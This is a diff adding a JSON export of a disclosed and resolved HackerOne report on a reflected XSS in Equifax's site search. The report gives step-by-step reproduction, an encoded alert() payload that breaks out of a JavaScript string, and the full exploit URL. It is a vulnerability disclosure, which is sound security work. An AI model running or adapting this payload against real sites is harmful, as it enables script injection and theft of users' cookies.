@@ -1,0 +1,160 @@
+{
+  "id": 1818172,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODE4MTcy",
+  "url": "https://hackerone.com/reports/1818172",
+  "title": "reflected XSS in [www.equifax.com]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-12-28T20:06:27.391Z",
+  "submitted_at": "2022-12-28T20:06:27.578Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "abdoubouanik",
+    "url": "/abdoubouanik",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/a2kio7paukmmfxy3xvh18atwe9n6/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 5044,
+    "url": "https://hackerone.com/equifax",
+    "handle": "equifax",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/005/044/ba20ca159dad308d753710d2b8ae8dd665a60b80_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/005/044/ba20ca159dad308d753710d2b8ae8dd665a60b80_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Equifax-vdp",
+      "twitter_handle": "",
+      "website": "http://www.equifax.com",
+      "about": "Vulnerability Disclosure Program"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-04-23T12:40:15.348Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-03-24T12:40:14.823Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "hi , I hope you are well, i found reflected XSS in this endpoint via ```q```  parameter:\n```https://www.equifax.com/personal/search?q=broook```\n\n###Steps:\n\n1. open ```https://www.equifax.com/personal/search?q=broook```\n2. view the source code of the page and search for word broook you will find that it reflected in the source code: \n{F2094877}\n\n-\n-\n\n3. ```broook``` word reflected in javascript code:\n```\n<script type=\"text/javascript\">\n\nvar pageProduct = null;\nwindow.onload = function(e){ \n\t\t\n\t\tAnalytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: \"broook\" , numOfSearchResultsReturned: 1});\n\t\n}\n</script>\n\n```\n-\n-\n\n4. By using this payload ```%22%20%2C%20internalSearchTerm%3A%20%5B\"broook\"%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b``` , I modified the parameters of the ```Analytics.trackEvent``` function to be like this:\n```\n<script type=\"text/javascript\">\n\nvar pageProduct = null;\nwindow.onload = function(e){ \n\t\t\n\t\tAnalytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: \"\" , internalSearchTerm: [\"broook\"].map(alert) , numOfSearchResultsReturned: \"b\" , numOfSearchResultsReturned: 1});\n\t\n}\n</script>\n```\n{F2094892}\n\n-\n-\n\n5. the following is the link with my XSS payload:   https://www.equifax.com/personal/search?q=%22%20%2C%20internalSearchTerm%3A%20%5B\"broook\"%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b\n\n{F2094902}\n\n## Impact\n\nan attacker can exeute JS codes on the victims and this could be steal user's cookies",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2094877,
+      "file_name": "Screenshot_2022-12-28_20-43-33.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hnovttpeuk8xlyjtdv6ol6uy8ih1?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2022-12-28_20-43-33.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2022-12-28_20-43-33.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRRGSGMTT%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T212306Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzbSrr2kTA4DaFCRKn82eiuZDOKi8bGDJKHwUeQ3X9SAiEAyedZfH%2FfsH03BQ6JWLrXmxy6ur0tE1XqhJIzkk3eM6kqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFNwPTElP2T1riql3iqOBQOQR3Vium1jwCWrRvkhZl3cKOipU7n11LVdSkeov7RZyFABD8UhvBgvDfWjFVSEggHH4LHedfCdH8OJQFzly%2FVTfjhRejT5URsLnn%2Bazp2lXARgwFS5ZfNoEaUqJ67iXjTH7KEwtoDPIxspBUsrSoW92AzEo7vKpZQPo5ANE7U%2FmWNZ57HvY3fq3M3nINSBVpNfJpkxXGOpcK1Z3mc1eMP5u5fUiUCoXh7CpJXHDaxmL8o7LS52JO%2F2mTKxMKCWSi1Y7cI0YIe5yx3E0I9M4l3yHKYBL7ADH%2F666I7YY6Ix9o9Oa6KgkM11IoSCMXvCEZAXRw2npuPsjca3DmK%2F4lJln%2B9itsJqby3JqmE%2BPyJgV4aymsnk3FGQHYu9gx4pXiXcGtnDDSu2DmHa8AhTFav0ub9Hj6hzQftyTBoO5vyN60Mzm7dtZGxaW9VIAgjYI9tjmaUhkiUZ7YFeZrhvI8v%2Btfy%2BByPOnjslojNwpgDb1WWEHjoN89kdBjiAvqR5c3tyG%2FMkKb3lRqX5rDReNoGtOIPiDOMzSBbxgHBwSjp3emMk%2BXva7SHcTWCQWQF%2BKIBXvFLePqoYAMVOAdp2G7RA84bddk%2BleFW0H1B2D11tKg9EEelRF3aJVepg%2FsR%2Bex1lPIhQ7q65H6Wwf8Sscbt9SSqnhEBqLjPbtqNVoggMAvnfgtlEWvY0iARl6%2FbeIDlwUq%2Bt330gO%2BOdtEuBZ2RjpzkaVhqODWthmEKrvQqAHmm6TQHqh%2BGPVaMsdUGjFMVmfh8WfkFiR4YQgMxMQaE%2BSXInlGBkf8idKtFfO3r3fYlE6KtWJEB1cEWvhGji1ryhe6zHePoFIBst8baJLmUAtnPuWWAGwoLQ9%2BSsAzDhu%2BLMBjqxAQu6V5SbBpFWLCLKt8Q4kPcU34ogOaFRD%2Fcfo4cBcT5DtlCAaM1o5oF5uRnDICtTVju8W2CCtojNAoH0C8Rnj6HdYJlCi7Rny5xy0YffVVA7lA8tkWABhvomVYg2UWQuEr6n10z94%2BKPDEaLtYPTWP8%2BNV9%2BLzyYNnv2YYCPSLVGJV9cAvj3ygxs2264HWsQgovCXRSf3p950Tc1HIh6jDVRz75yafD5azzFTNVI5cRDjQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7fcd5b1d5f06bb36562effce596e393f4ee8fb7bded8dace6881550b0e2375cf",
+      "file_size": 284194,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2094892,
+      "file_name": "Screenshot_2022-12-28_20-56-04.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2czg89f6uvldgm64w66u8f4ttvbz?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2022-12-28_20-56-04.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2022-12-28_20-56-04.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRRGSGMTT%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T212306Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzbSrr2kTA4DaFCRKn82eiuZDOKi8bGDJKHwUeQ3X9SAiEAyedZfH%2FfsH03BQ6JWLrXmxy6ur0tE1XqhJIzkk3eM6kqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFNwPTElP2T1riql3iqOBQOQR3Vium1jwCWrRvkhZl3cKOipU7n11LVdSkeov7RZyFABD8UhvBgvDfWjFVSEggHH4LHedfCdH8OJQFzly%2FVTfjhRejT5URsLnn%2Bazp2lXARgwFS5ZfNoEaUqJ67iXjTH7KEwtoDPIxspBUsrSoW92AzEo7vKpZQPo5ANE7U%2FmWNZ57HvY3fq3M3nINSBVpNfJpkxXGOpcK1Z3mc1eMP5u5fUiUCoXh7CpJXHDaxmL8o7LS52JO%2F2mTKxMKCWSi1Y7cI0YIe5yx3E0I9M4l3yHKYBL7ADH%2F666I7YY6Ix9o9Oa6KgkM11IoSCMXvCEZAXRw2npuPsjca3DmK%2F4lJln%2B9itsJqby3JqmE%2BPyJgV4aymsnk3FGQHYu9gx4pXiXcGtnDDSu2DmHa8AhTFav0ub9Hj6hzQftyTBoO5vyN60Mzm7dtZGxaW9VIAgjYI9tjmaUhkiUZ7YFeZrhvI8v%2Btfy%2BByPOnjslojNwpgDb1WWEHjoN89kdBjiAvqR5c3tyG%2FMkKb3lRqX5rDReNoGtOIPiDOMzSBbxgHBwSjp3emMk%2BXva7SHcTWCQWQF%2BKIBXvFLePqoYAMVOAdp2G7RA84bddk%2BleFW0H1B2D11tKg9EEelRF3aJVepg%2FsR%2Bex1lPIhQ7q65H6Wwf8Sscbt9SSqnhEBqLjPbtqNVoggMAvnfgtlEWvY0iARl6%2FbeIDlwUq%2Bt330gO%2BOdtEuBZ2RjpzkaVhqODWthmEKrvQqAHmm6TQHqh%2BGPVaMsdUGjFMVmfh8WfkFiR4YQgMxMQaE%2BSXInlGBkf8idKtFfO3r3fYlE6KtWJEB1cEWvhGji1ryhe6zHePoFIBst8baJLmUAtnPuWWAGwoLQ9%2BSsAzDhu%2BLMBjqxAQu6V5SbBpFWLCLKt8Q4kPcU34ogOaFRD%2Fcfo4cBcT5DtlCAaM1o5oF5uRnDICtTVju8W2CCtojNAoH0C8Rnj6HdYJlCi7Rny5xy0YffVVA7lA8tkWABhvomVYg2UWQuEr6n10z94%2BKPDEaLtYPTWP8%2BNV9%2BLzyYNnv2YYCPSLVGJV9cAvj3ygxs2264HWsQgovCXRSf3p950Tc1HIh6jDVRz75yafD5azzFTNVI5cRDjQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5be790315d59e196a931bc3cd0892b7150709e4a771518aac20481b7011b7319",
+      "file_size": 299285,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2094902,
+      "file_name": "Screenshot_2022-12-28_20-54-41.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/s45sl4ubo0oln0fx0yocpfexcv9o?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2022-12-28_20-54-41.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2022-12-28_20-54-41.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRRGSGMTT%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T212306Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzbSrr2kTA4DaFCRKn82eiuZDOKi8bGDJKHwUeQ3X9SAiEAyedZfH%2FfsH03BQ6JWLrXmxy6ur0tE1XqhJIzkk3eM6kqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFNwPTElP2T1riql3iqOBQOQR3Vium1jwCWrRvkhZl3cKOipU7n11LVdSkeov7RZyFABD8UhvBgvDfWjFVSEggHH4LHedfCdH8OJQFzly%2FVTfjhRejT5URsLnn%2Bazp2lXARgwFS5ZfNoEaUqJ67iXjTH7KEwtoDPIxspBUsrSoW92AzEo7vKpZQPo5ANE7U%2FmWNZ57HvY3fq3M3nINSBVpNfJpkxXGOpcK1Z3mc1eMP5u5fUiUCoXh7CpJXHDaxmL8o7LS52JO%2F2mTKxMKCWSi1Y7cI0YIe5yx3E0I9M4l3yHKYBL7ADH%2F666I7YY6Ix9o9Oa6KgkM11IoSCMXvCEZAXRw2npuPsjca3DmK%2F4lJln%2B9itsJqby3JqmE%2BPyJgV4aymsnk3FGQHYu9gx4pXiXcGtnDDSu2DmHa8AhTFav0ub9Hj6hzQftyTBoO5vyN60Mzm7dtZGxaW9VIAgjYI9tjmaUhkiUZ7YFeZrhvI8v%2Btfy%2BByPOnjslojNwpgDb1WWEHjoN89kdBjiAvqR5c3tyG%2FMkKb3lRqX5rDReNoGtOIPiDOMzSBbxgHBwSjp3emMk%2BXva7SHcTWCQWQF%2BKIBXvFLePqoYAMVOAdp2G7RA84bddk%2BleFW0H1B2D11tKg9EEelRF3aJVepg%2FsR%2Bex1lPIhQ7q65H6Wwf8Sscbt9SSqnhEBqLjPbtqNVoggMAvnfgtlEWvY0iARl6%2FbeIDlwUq%2Bt330gO%2BOdtEuBZ2RjpzkaVhqODWthmEKrvQqAHmm6TQHqh%2BGPVaMsdUGjFMVmfh8WfkFiR4YQgMxMQaE%2BSXInlGBkf8idKtFfO3r3fYlE6KtWJEB1cEWvhGji1ryhe6zHePoFIBst8baJLmUAtnPuWWAGwoLQ9%2BSsAzDhu%2BLMBjqxAQu6V5SbBpFWLCLKt8Q4kPcU34ogOaFRD%2Fcfo4cBcT5DtlCAaM1o5oF5uRnDICtTVju8W2CCtojNAoH0C8Rnj6HdYJlCi7Rny5xy0YffVVA7lA8tkWABhvomVYg2UWQuEr6n10z94%2BKPDEaLtYPTWP8%2BNV9%2BLzyYNnv2YYCPSLVGJV9cAvj3ygxs2264HWsQgovCXRSf3p950Tc1HIh6jDVRz75yafD5azzFTNVI5cRDjQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=284d10830494d9f13ef94ae41684e507a9de72991603cd758f1ad399324a0ee7",
+      "file_size": 231445,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-04-23T12:40:15.034Z",
+  "allow_singular_disclosure_after": -89368971.35472955,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "abdoubouanik",
+    "nicochess",
+    "8910jq",
+    "zy9ard3",
+    "shreyaschavhan",
+    "address_below0",
+    "shubham_srt",
+    "infosec_0a",
+    "shivammusic",
+    "sayin",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 33186,
+    "asset_type": "OTHER",
+    "asset_identifier": "*equifax.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
